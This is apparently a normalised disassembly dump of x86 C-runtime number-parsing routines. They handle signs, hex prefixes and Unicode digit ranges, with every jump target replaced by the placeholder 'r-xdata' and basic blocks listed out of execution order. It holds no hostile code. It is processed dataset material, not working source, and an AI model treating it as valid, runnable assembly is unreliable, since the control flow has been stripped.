mov [ ebp - 0x8 ] al
mov [ ebp + 0xc ] esi
cmp al 0x78
je r-xdata
lea eax [ ebx - 0x41 ]
cmp al 0x19
ja r-xdata
movsx ecx bl
add ecx 0xffffffa9
jmp r-xdata
cmp ecx 0xffffffff
je r-xdata
mov [ ebp + 0x14 ] 0xa
test ecx ecx
jne r-xdata
cmp al 0x58
je r-xdata
dec esi
mov [ ebp + 0xc ] esi
test bl bl
je r-xdata
movsx ecx bl
add ecx 0xffffffc9
cmp ecx edx
jae r-xdata
mov bl [ esi ]
inc esi
mov [ ebp + 0xc ] esi
jmp r-xdata
mov [ ebp + 0x14 ] 0x10
test ecx ecx
jne r-xdata
mov ebx [ ebp - 0x4 ]
test bl 0x8
jne r-xdata
cmp [ esi ] bl
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp - 0x8 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
cmp edi ebx
jb r-xdata
push [ ebp - 0x8 ]
lea ecx [ ebp + 0xc ]
call sub_42ec80
mov esi [ ebp + 0xc ]
jmp r-xdata
mov [ ebp + 0x14 ] 0x8
test bl 0x4
jne r-xdata
mov esi [ ebp - 0x10 ]
xor edi edi
mov [ ebp + 0xc ] esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov esi [ ebp + 0xc ]
mov bl [ esi ]
imul edi edx
add edi ecx
inc esi
mov [ ebp + 0xc ] esi
jmp r-xdata
jne r-xdata
call sub_42fef5
mov [ eax ] 0x22
test bl 0x1
jne r-xdata
test bl 0x1
je r-xdata
cmp [ ebp - 0x14 ] 0x0
pop ebx
je r-xdata
lea ecx [ ebx - 0x30 ]
cmp cl 0x9
ja r-xdata
mov bl [ esi ]
or eax 0x4
inc esi
mov [ ebp - 0x4 ] eax
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ecx [ ebp - 0xc ]
jbe r-xdata
mov edi 0x80000000
test bl 0x2
jne r-xdata
or edi 0xffffffff
jmp r-xdata
test bl 0x2
je r-xdata
mov eax ebx
and eax 0x2
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x20 ]
and [ ecx + 0x350 ] 0xfffffffd
mov esi [ ebp + 0xc ]
mov edi 0x7fffffff
neg edi
jmp r-xdata
test eax eax
jne r-xdata
cmp edi 0x80000000
ja r-xdata
cmp edi 0x7fffffff
ja r-xdata
sub_42d530
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
cmp [ ebp + 0xc ] 0x0
push ebx
push edi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
call sub_41cb44
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] eax
push 0x8
movzx esi [ eax ]
add eax 0x2
push esi
mov [ ebp + 0xc ] eax
call sub_43db11
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x2
jl r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
xor ecx ecx
cmp [ ebp + 0x18 ] cl
setne cl
mov [ ebp - 0x4 ] ecx
cmp si 0x2d
jne r-xdata
mov eax [ ebp + 0xc ]
push 0x8
movzx esi [ eax ]
add eax 0x2
push esi
mov [ ebp + 0xc ] eax
call sub_43db11
add esp 0x8
test eax eax
jne r-xdata
cmp eax 0x24
jle r-xdata
cmp si 0x2b
jne r-xdata
mov edi [ ebp + 0xc ]
or ecx 0x2
mov [ ebp - 0x4 ] ecx
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp + 0xc ]
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov eax 0xff10
test edx edx
je r-xdata
cmp si 0x30
jb r-xdata
cmp edx 0x10
jne r-xdata
mov eax 0x41
cmp ax si
ja r-xdata
cmp si 0x3a
jae r-xdata
xor edx edx
or eax 0xffffffff
div [ ebp + 0x14 ]
mov [ ebp - 0x4 ] edx
mov edx eax
nop
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
mov eax 0x41
cmp ax si
ja r-xdata
cmp si 0x3a
jae r-xdata
test edx edx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
mov [ ebp + 0x14 ] 0xa
add eax 0xffffffc9
sub eax 0x20
movzx eax si
sub eax 0xff10
mov eax 0x66a
cmp si ax
jae r-xdata
test eax eax
jne r-xdata
sub edi 0x2
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0xc ] edi
test si si
je r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
movzx eax [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
cmp eax 0x78
je r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
test cl 0x8
jne r-xdata
cmp [ edi ] si
je r-xdata
add eax 0xffffffc9
sub eax 0x20
movzx eax si
sub eax 0xff10
mov eax 0x66a
cmp si ax
jae r-xdata
cmp eax 0xffffffff
je r-xdata
test edx edx
jne r-xdata
cmp eax 0x58
je r-xdata
mov eax 0x6fa
cmp si ax
jae r-xdata
test cl 0x4
jne r-xdata
mov edi [ ebp - 0x8 ]
xor ebx ebx
mov [ ebp + 0xc ] edi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov edi [ ebp + 0xc ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
mov [ ebp + 0x14 ] 0x10
test edx edx
jne r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
jne r-xdata
test cl 0x1
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
or ecx 0x8
cmp ebx edx
jb r-xdata
mov eax 0x6fa
cmp si ax
jae r-xdata
push eax
lea ecx [ ebp + 0xc ]
call sub_42ecb0
mov edi [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
jmp r-xdata
mov [ ebp + 0x14 ] 0x8
mov eax 0x970
cmp si ax
jae r-xdata
mov ebx 0x80000000
test al 0x2
jne r-xdata
or ebx 0xffffffff
jmp r-xdata
test cl 0x2
je r-xdata
mov eax ecx
and eax 0x2
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x18 ]
and [ ecx + 0x350 ] 0xfffffffd
imul ebx [ ebp + 0x14 ]
movzx esi [ edi ]
add ebx eax
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
jne r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx 0x7fffffff
neg ebx
jmp r-xdata
test eax eax
jne r-xdata
cmp ebx 0x80000000
ja r-xdata
cmp si 0x30
jb r-xdata
movzx esi [ edi ]
or ecx 0x4
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
cmp eax [ ebp - 0x4 ]
jbe r-xdata
mov eax 0x970
cmp si ax
jae r-xdata
mov eax 0x9f0
cmp si ax
jae r-xdata
cmp ebx 0x7fffffff
ja r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
mov eax 0x9f0
cmp si ax
jae r-xdata
mov eax 0xa70
cmp si ax
jae r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
mov eax 0xa70
cmp si ax
jae r-xdata
mov eax 0xaf0
cmp si ax
jae r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
mov eax 0xaf0
cmp si ax
jae r-xdata
mov eax 0xb70
cmp si ax
jae r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
mov eax 0xb70
cmp si ax
jae r-xdata
mov eax 0xc70
cmp si ax
jae r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
mov eax 0xc70
cmp si ax
jae r-xdata
mov eax 0xcf0
cmp si ax
jae r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
mov eax 0xcf0
cmp si ax
jae r-xdata
mov eax 0xd70
cmp si ax
jae r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
mov eax 0xd70
cmp si ax
jae r-xdata
mov eax 0xe5a
cmp si ax
jae r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
mov eax 0xe5a
cmp si ax
jae r-xdata
mov eax 0xeda
cmp si ax
jae r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
mov eax 0xeda
cmp si ax
jae r-xdata
mov eax 0xf2a
cmp si ax
jae r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
mov eax 0xf2a
cmp si ax
jae r-xdata
mov eax 0x104a
cmp si ax
jae r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
mov eax 0x104a
cmp si ax
jae r-xdata
mov eax 0x17ea
cmp si ax
jae r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
mov eax 0x17ea
cmp si ax
jae r-xdata
mov eax 0x181a
cmp si ax
jae r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
mov eax 0x181a
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
sub_42dca0
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor ebx ebx
xor edi edi
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov esi [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x38 ]
call sub_41cb44
mov esi [ ebp + 0xc ]
xor edi edi
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x28 ] esi
cmp eax 0x2
jl r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov [ eax ] esi
mov eax [ ecx ]
movzx eax [ eax + edx * 2 ]
and eax 0x8
lea eax [ ebp - 0x34 ]
push eax
push 0x8
push edx
call sub_43dba1
mov esi [ ebp + 0xc ]
add esp 0xc
mov ecx [ ebp - 0x34 ]
jmp r-xdata
cmp eax 0x24
jle r-xdata
mov bl [ esi ]
inc esi
mov [ ebp + 0xc ] esi
cmp [ ecx + 0x4 ] 0x1
movzx edx bl
jle r-xdata
cmp [ ebp + 0x18 ] al
mov [ ebp - 0x1 ] bl
setne al
mov [ ebp - 0x8 ] eax
cmp bl 0x2d
jne r-xdata
test eax eax
jne r-xdata
cmp bl 0x2b
jne r-xdata
or eax 0x2
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
mov bl [ esi ]
inc esi
mov [ ebp - 0x1 ] bl
mov [ ebp + 0xc ] esi
mov al bl
sub al 0x30
cmp al 0x9
ja r-xdata
cmp ecx 0x10
jne r-xdata
mov al bl
sub al 0x61
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffd0
jmp r-xdata
mov eax ecx
mov al bl
sub al 0x41
cmp al 0x19
ja r-xdata
movsx eax bl
add eax 0xffffffa9
jmp r-xdata
test eax eax
jne r-xdata
lea ecx [ eax - 0x61 ]
cmp cl 0x19
ja r-xdata
movsx ecx al
add ecx 0xffffffd0
jmp r-xdata
test ecx ecx
jne r-xdata
movsx eax bl
add eax 0xffffffc9
mov al [ esi ]
inc esi
mov [ ebp - 0x14 ] al
mov [ ebp + 0xc ] esi
cmp al 0x78
je r-xdata
lea ecx [ eax - 0x41 ]
cmp cl 0x19
ja r-xdata
movsx ecx al
add ecx 0xffffffa9
jmp r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
je r-xdata
mov eax 0xa
mov [ ebp + 0x14 ] eax
jmp r-xdata
test ecx ecx
jne r-xdata
cmp al 0x58
je r-xdata
dec esi
mov [ ebp - 0x8 ] ebx
mov [ ebp + 0xc ] esi
test al al
je r-xdata
movsx ecx al
add ecx 0xffffffc9
cmp ecx [ ebp + 0x14 ]
jae r-xdata
cdq
mov ecx eax
mov eax edx
push eax
push ecx
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] eax
call sub_449720
mov [ ebp - 0x18 ] ebx
mov ebx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
mov [ ebp - 0x14 ] edx
xor edx edx
mov [ ebp - 0x1c ] ecx
mov bl [ esi ]
inc esi
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1 ] bl
mov [ ebp + 0xc ] esi
jmp r-xdata
mov [ ebp + 0x14 ] 0x10
test ecx ecx
jne r-xdata
test bl 0x8
jne r-xdata
cmp [ esi ] al
je r-xdata
or ebx 0x8
cmp edi [ ebp - 0x14 ]
jb r-xdata
push [ ebp - 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_42ec80
mov esi [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
jmp r-xdata
mov [ ebp + 0x14 ] 0x8
mov ebx [ ebp - 0xc ]
push edi
push ebx
push [ ebp - 0x8 ]
call sub_42d240
add esp 0xc
test al al
je r-xdata
mov esi [ ebp - 0x28 ]
xor ebx ebx
mov [ ebp + 0xc ] esi
xor edi edi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov esi [ ebp + 0xc ]
push edi
push edx
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
call sub_449900
add eax [ ebp - 0x8 ]
mov edi edx
mov [ ebp - 0xc ] eax
mov edx eax
mov al [ esi ]
adc edi 0x0
inc esi
mov [ ebp + 0xc ] esi
jmp r-xdata
mov eax [ ebp - 0x10 ]
ja r-xdata
test [ ebp - 0x8 ] 0x2
je r-xdata
call sub_42fef5
mov [ eax ] 0x22
mov eax [ ebp - 0x8 ]
mov esi [ ebp + 0xc ]
test al 0x1
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
lea ecx [ eax - 0x30 ]
cmp cl 0x9
ja r-xdata
cmp edx eax
jne r-xdata
cmp edx eax
jb r-xdata
neg ebx
adc edi 0x0
neg edi
test al 0x2
je r-xdata
or ebx 0xffffffff
or edi 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edx edi
test eax eax
je r-xdata
mov ecx [ ebp - 0x38 ]
and [ ecx + 0x350 ] 0xfffffffd
mov al [ esi ]
or ebx 0x4
inc esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp edi [ ebp - 0x14 ]
jne r-xdata
or ebx 0xffffffff
mov edi 0x7fffffff
jmp r-xdata
xor ebx ebx
mov edi 0x80000000
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x18 ]
jb r-xdata
ja r-xdata
cmp ecx [ ebp - 0x1c ]
jbe r-xdata
sub_42df60
mov edi edi
push ebp
mov ebp esp
sub esp 0x3c
cmp [ ebp + 0xc ] 0x0
push ebx
push esi
push edi
je r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
xor ebx ebx
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x3c ]
call sub_41cb44
mov eax [ ebp + 0xc ]
xor esi esi
mov [ ebp - 0x10 ] esi
xor ebx ebx
mov [ ebp - 0x2c ] eax
push 0x8
movzx esi [ eax ]
add eax 0x2
push esi
mov [ ebp - 0xc ] ebx
mov [ ebp + 0xc ] eax
call sub_43db11
add esp 0x8
test eax eax
je r-xdata
cmp eax 0x2
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
xor eax eax
cmp [ ebp + 0x18 ] al
setne al
mov [ ebp - 0x4 ] eax
cmp si 0x2d
jne r-xdata
mov edi edi
cmp eax 0x24
jle r-xdata
cmp si 0x2b
jne r-xdata
mov edi [ ebp + 0xc ]
or eax 0x2
mov [ ebp - 0x4 ] eax
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x8
movzx esi [ eax ]
add eax 0x2
push esi
mov [ ebp + 0xc ] eax
call sub_43db11
add esp 0x8
test eax eax
jne r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp + 0xc ]
movzx esi [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
jmp r-xdata
mov ebx [ ebp + 0x14 ]
mov ecx 0x660
mov [ ebp - 0x8 ] edi
mov eax 0xff10
lea edx [ ecx + 0xa ]
test ebx ebx
je r-xdata
cmp si 0x30
jb r-xdata
cmp ebx 0x10
jne r-xdata
mov eax 0x41
cmp ax si
ja r-xdata
cmp si 0x3a
jae r-xdata
mov eax ebx
cdq
mov ecx eax
mov eax edx
push eax
push ecx
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] eax
call sub_449720
mov [ ebp - 0x20 ] ecx
mov ecx edx
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] ecx
mov edi edi
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
cmp si ax
jae r-xdata
movzx eax si
sub eax 0x30
jmp r-xdata
mov eax 0x41
cmp ax si
ja r-xdata
cmp si 0x3a
jae r-xdata
test ebx ebx
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
cmp si cx
jb r-xdata
cmp eax 0xffffffff
jne r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
mov eax 0xff10
cmp si ax
jae r-xdata
movzx edi si
sub edi 0x30
jmp r-xdata
mov ebx 0xa
mov [ ebp + 0x14 ] ebx
add eax 0xffffffc9
sub eax 0x20
movzx eax si
sub eax 0xff10
cmp si dx
jae r-xdata
test eax eax
jne r-xdata
mov edi [ ebp - 0x8 ]
sub edi 0x2
mov [ ebp - 0x4 ] ebx
mov [ ebp + 0xc ] edi
test si si
je r-xdata
lea eax [ esi - 0x61 ]
movzx edi si
cmp ax 0x19
ja r-xdata
mov eax 0xff1a
cmp si ax
jae r-xdata
mov eax 0x660
cmp si ax
jb r-xdata
cmp edi 0xffffffff
jne r-xdata
movzx eax [ edi ]
add edi 0x2
mov [ ebp + 0xc ] edi
cmp eax 0x78
je r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x660
jmp r-xdata
test bl 0x8
jne r-xdata
cmp [ edi ] si
je r-xdata
add edi 0xffffffc9
sub edi 0x20
movzx edi si
sub edi 0xff10
mov eax 0x66a
cmp si ax
jae r-xdata
cmp edi 0xffffffff
je r-xdata
test ebx ebx
jne r-xdata
cmp eax 0x58
je r-xdata
mov eax 0x6fa
cmp si ax
jae r-xdata
mov esi [ ebp - 0x10 ]
mov ebx [ ebp - 0xc ]
push esi
push ebx
push [ ebp - 0x4 ]
call sub_42d240
add esp 0xc
test al al
je r-xdata
mov edi [ ebp - 0x2c ]
xor ebx ebx
mov [ ebp + 0xc ] edi
xor esi esi
jmp r-xdata
call sub_42fef5
mov [ eax ] 0x16
call sub_42fdcf
mov edi [ ebp + 0xc ]
cmp edi [ ebp + 0x14 ]
jae r-xdata
mov eax 0x6f0
cmp si ax
jb r-xdata
movzx edi si
sub edi 0x660
jmp r-xdata
movzx esi [ edi ]
add edi 0x2
mov [ ebp - 0x8 ] edi
mov [ ebp + 0xc ] edi
jmp r-xdata
mov ebx 0x10
mov [ ebp + 0x14 ] ebx
test ebx ebx
jne r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x6f0
jmp r-xdata
test [ ebp - 0x4 ] 0x2
je r-xdata
call sub_42fef5
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
test al 0x1
jne r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
or ebx 0x8
cmp eax ecx
mov ecx [ ebp - 0xc ]
jb r-xdata
mov eax 0x6fa
cmp si ax
jae r-xdata
push eax
lea ecx [ ebp + 0xc ]
call sub_42ecb0
mov edi [ ebp + 0xc ]
mov [ ebp - 0x8 ] edi
jmp r-xdata
mov ebx 0x8
mov [ ebp + 0x14 ] ebx
mov eax 0x970
cmp si ax
jae r-xdata
neg ebx
adc esi 0x0
neg esi
test al 0x2
je r-xdata
or ebx 0xffffffff
or esi 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax ebx
mov edx esi
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x3c ]
and [ ecx + 0x350 ] 0xfffffffd
push eax
push ecx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
call sub_449900
mov ecx eax
mov eax edx
add ecx edi
mov [ ebp - 0xc ] ecx
adc eax 0x0
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x14 ]
ja r-xdata
mov eax 0x966
cmp si ax
jb r-xdata
movzx edi si
sub edi 0x6f0
jmp r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x966
jmp r-xdata
or ebx 0xffffffff
mov esi 0x7fffffff
jmp r-xdata
xor ebx ebx
mov esi 0x80000000
jmp r-xdata
cmp si 0x30
jb r-xdata
cmp ecx edx
jne r-xdata
cmp ecx edx
jb r-xdata
mov eax 0x970
cmp si ax
jae r-xdata
mov eax 0x9f0
cmp si ax
jae r-xdata
or ebx 0x4
jmp r-xdata
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax 0x9e6
cmp si ax
jb r-xdata
movzx edi si
sub edi 0x966
jmp r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x9e6
jmp r-xdata
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0x18 ]
movzx esi [ edi ]
add edi 0x2
mov [ ebp - 0x8 ] edi
mov [ ebp + 0xc ] edi
jmp r-xdata
xor edx edx
cmp edx [ ebp - 0x1c ]
jb r-xdata
mov eax 0x9f0
cmp si ax
jae r-xdata
mov eax 0xa70
cmp si ax
jae r-xdata
ja r-xdata
mov eax 0xa66
cmp si ax
jb r-xdata
movzx edi si
sub edi 0x9e6
jmp r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xa66
jmp r-xdata
cmp edi [ ebp - 0x20 ]
jbe r-xdata
mov eax 0xa70
cmp si ax
jae r-xdata
mov eax 0xaf0
cmp si ax
jae r-xdata
mov eax 0xae6
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xa66
jmp r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xae6
jmp r-xdata
mov eax 0xaf0
cmp si ax
jae r-xdata
mov eax 0xb70
cmp si ax
jae r-xdata
mov eax 0xb66
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xae6
jmp r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xb66
jmp r-xdata
mov eax 0xb70
cmp si ax
jae r-xdata
mov eax 0xc70
cmp si ax
jae r-xdata
mov eax 0xc66
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xb66
jmp r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xc66
jmp r-xdata
mov eax 0xc70
cmp si ax
jae r-xdata
mov eax 0xcf0
cmp si ax
jae r-xdata
mov eax 0xce6
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xc66
jmp r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xce6
jmp r-xdata
mov eax 0xcf0
cmp si ax
jae r-xdata
mov eax 0xd70
cmp si ax
jae r-xdata
mov eax 0xd66
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xce6
jmp r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xd66
jmp r-xdata
mov eax 0xd70
cmp si ax
jae r-xdata
mov eax 0xe5a
cmp si ax
jae r-xdata
mov eax 0xe50
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xd66
jmp r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xe50
jmp r-xdata
mov eax 0xe5a
cmp si ax
jae r-xdata
mov eax 0xeda
cmp si ax
jae r-xdata
mov eax 0xed0
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xe50
jmp r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xed0
jmp r-xdata
mov eax 0xeda
cmp si ax
jae r-xdata
mov eax 0xf2a
cmp si ax
jae r-xdata
mov eax 0xf20
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xed0
jmp r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx eax si
sub eax 0xf20
jmp r-xdata
mov eax 0xf2a
cmp si ax
jae r-xdata
mov eax 0x104a
cmp si ax
jae r-xdata
mov eax 0x1040
cmp si ax
jb r-xdata
movzx edi si
sub edi 0xf20
jmp r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x1040
jmp r-xdata
mov eax 0x104a
cmp si ax
jae r-xdata
mov eax 0x17ea
cmp si ax
jae r-xdata
mov eax 0x17e0
cmp si ax
jb r-xdata
movzx edi si
sub edi 0x1040
jmp r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx eax si
sub eax 0x17e0
jmp r-xdata
mov eax 0x17ea
cmp si ax
jae r-xdata
mov eax 0x181a
cmp si ax
jae r-xdata
mov eax 0x1810
cmp si ax
jb r-xdata
movzx edi si
sub edi 0x17e0
jmp r-xdata
movzx eax si
sub eax 0x1810
jmp r-xdata
mov eax 0x181a
cmp si ax
jae r-xdata
movzx edi si
sub edi 0x1810
jmp r-xdata
sub_42e740
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
sub esp 0x8
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_42d290
add esp 0xc
push [ ebp + 0x14 ]
call sub_42d2d0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_42e770
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
